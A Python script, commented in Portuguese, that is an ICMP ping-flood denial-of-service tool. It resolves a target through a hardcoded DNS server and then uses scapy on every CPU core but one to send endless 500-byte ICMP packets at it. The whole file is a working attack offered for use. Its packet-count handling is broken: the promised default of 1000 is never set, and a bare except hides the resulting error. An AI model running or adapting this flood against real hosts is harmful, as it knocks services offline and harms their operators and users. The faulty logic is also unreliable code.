import time
import sys
import multiprocessing
from scapy.all import *


def preset(cpu_number, packet_count):
    # Este método é responsável por iniciar processos de multiprocessing.
    processes = [multiprocessing.Process(target=start_attack, args=(packet_count,)) for _ in range(cpu_number)]

    for process in processes:
        process.start()
    for process in processes:
        process.join()


def start_attack(packet_count):
    ip_address = ""
    data = b"X" * 500  # Altere 500 para ajustar o valor de bytes no campo de dados ICMP.

    if len(sys.argv) < 2:
        print("Forneca um IP ou DNS")
    else:
        try:
            packet = sr1(IP(dst="195.175.39.49")/UDP()/DNS(rd=1, qd=DNSQR(qname=sys.argv[1])), verbose=False)
            ip_address = packet[1][DNSRR].rdata
        except:
            ip_address = sys.argv[1]

        # Define a velocidade de envio de pacotes (em pacotes por segundo)
        send(IP(dst=ip_address)/ICMP()/data, verbose=False, count=packet_count, inter=0.001, loop=1)


def main():
    t = round(time.time())

    # Verifica se um número de pacotes foi fornecido como argumento de linha de comando
    if len(sys.argv) >= 3:
        try:
            packet_count = int(sys.argv[2])
        except ValueError:
            print("Quantidade de Pacote Invalido. Vou usar o Default (1000).")

    preset(multiprocessing.cpu_count()-1, packet_count)  # Esta ferramenta usará todos os núcleos da sua CPU [exceto o primeiro núcleo] para obter o máximo de eficácia para este ataque.

    print("Ataque finalizado: %s Segundos" % (round(time.time() - t)))
    sys.exit()


if __name__ == '__main__':
    banner = """ \033[1m \033[33m
Por favor aguarde o ataque.. selecione a tecla oculta \033[0m
     """
    print(banner)
    try:
        t = round(time.time())
        main()
    except:
        print("Ataque finalizado: %s Segundos" % (round(time.time() - t)))
        sys.exit()

